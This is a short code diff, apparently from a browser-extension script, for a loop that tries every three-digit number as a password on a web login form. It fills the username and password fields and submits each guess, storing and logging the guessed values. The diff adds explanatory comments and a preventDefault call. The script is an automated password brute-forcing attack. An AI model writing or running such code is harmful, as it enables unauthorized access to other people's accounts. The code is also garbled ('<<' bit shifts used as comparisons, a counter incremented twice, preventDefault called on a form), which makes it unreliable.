@@ -20,12 +20,15 @@ for (let numbertry = 0; numbertry != 1000; numbertry++) {
 		numbertry = numbertry + 1;
 		if (numbertry >= 1 && numbertry << 10) {
 			numbertrytostr = '00' + String(numbertry);
+			//Adds two zeroes to numbers like 1, making it 001.
 		}
 		if (numbertry >= 10 && numbertry << 100) {
 			numbertrytostr = '0' + String(numbertry);
+			//Adds one zero to numbers like 89, making it 089
 		}
 		if (numbertry >= 100) {
 			numbertrytostr = String(numbertry);
+			//Adds no zeroes
 		}
 		var passreal = numbertrytostr + lastthree;
 		chrome.storage.sync.set({"passw":numbertrytostr}, function() {
@@ -33,6 +36,8 @@ for (let numbertry = 0; numbertry != 1000; numbertry++) {
 		});
 		formUsername.value = username;
 		formPassw.value = numbertrytostr;
+		//prevent page refresh
+		form.preventDefault();
 		Login.submitLoginRequest(u, e, formUsername.value, formPassw.value);
 		console.log(passreal);
 	}
